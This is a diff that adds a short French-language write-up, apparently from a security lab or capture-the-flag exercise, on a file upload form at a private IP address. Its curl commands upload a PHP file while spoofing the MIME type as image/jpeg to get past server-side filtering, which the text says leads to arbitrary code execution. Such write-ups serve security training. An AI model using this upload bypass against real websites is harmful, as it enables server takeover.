@@ -1,0 +1,51 @@
+sur lka page : http://192.168.1.87/?page=upload
+
+Le site propose uniquement l’envoi d’une image via un formulaire d’upload composé :
+
+d’un champ permettant de sélectionner une image à importer,
+
+d’un bouton TÉLÉCHARGER.
+
+En analysant la requête envoyée après le téléversement d’un fichier, on constate que :
+
+la requête utilise la méthode POST au format multipart/form-data,
+
+le formulaire contient trois paramètres :MAX_FILE_SIZE=100000
+uploaded=[contenu du fichier]
+Upload=Upload
+
+Un premier test est réalisé avec une image classique (flower.jpg) :
+
+curl -i -X POST \
+-F "MAX_FILE_SIZE=100000" \
+-F "uploaded=@flower.jpg" \
+-F "Upload=Upload" \
+"http://192.168.1.87/?page=upload"
+
+
+Ensuite, un fichier PHP simple est créé (script.php) afin de tester la possibilité de téléverser un fichier exécutable.
+
+Nous tentons alors de l’envoyer :
+
+curl -i -X POST \
+-F "MAX_FILE_SIZE=100000" \
+-F "uploaded=@script.php" \
+-F "Upload=Upload" \
+"http://192.168.1.87/?page=upload"
+
+
+Pour contourner le filtrage basé sur le type MIME, curl permet de forcer une fausse signature MIME :
+
+-F "uploaded=@script.php;type=image/jpeg"
+
+
+La requête finale devient :
+
+curl -i -X POST \
+-F "MAX_FILE_SIZE=100000" \
+-F "uploaded=@script.php;type=image/jpeg" \
+-F "Upload=Upload" \
+"http://192.168.1.87/?page=upload"
+
+
+Cela permet de contourner le contrôle côté serveur et d’uploader un fichier PHP malveillant, ouvrant ainsi la voie à une exécution de code arbitraire
